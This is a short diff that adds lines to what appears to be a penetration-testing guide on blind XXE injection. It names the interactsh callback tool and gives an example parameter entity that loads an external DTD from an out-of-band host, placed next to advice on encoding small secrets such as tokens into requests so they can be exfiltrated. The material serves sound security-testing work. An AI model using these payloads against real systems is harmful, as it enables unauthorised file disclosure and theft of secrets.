@@ -49,6 +49,9 @@ XML External Entity injection is a parser-level failure that enables local file 
 
 - Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
 - Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)
+- Use `interactsh-client -v` for the callback domain. Reference it as the
+  external DTD host (e.g. `<!ENTITY % ex SYSTEM "http://xyz.oast.fun/x.dtd">`)
+  and read the DNS/HTTP hit on the interactsh stdout.
 
 ### Timing
 
